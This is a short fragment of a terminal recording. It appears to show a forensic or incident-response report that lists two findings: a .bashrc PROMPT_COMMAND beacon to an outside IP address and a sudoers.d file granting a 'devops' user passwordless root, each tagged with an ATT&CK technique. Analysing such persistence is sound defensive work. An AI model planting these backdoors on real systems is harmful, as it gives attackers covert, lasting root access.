[167.458453, "o", "   - **Shell-Init Persistence (`T1546.004`)**: Modified `/disk/root/.bashrc` to set `PROMPT_COMMAND` beaconing to `198.51.100.78` (*Silent / Unalerted*, `/disk/root/.bashrc`).\r\n\u001b[?2004l\r\u001b[?2004h> "]
[167.458746, "o", "   - **Sudoers Backdoor (`T1548.003`)**: Created `/disk/etc/sudoers.d/devops` configuring `devops ALL=(ALL) NOPASSWD: ALL` (*Silent / Unalerted*, `/disk/etc/sudoers.d/devops`).\r\n\u001b[?2004l\r"]
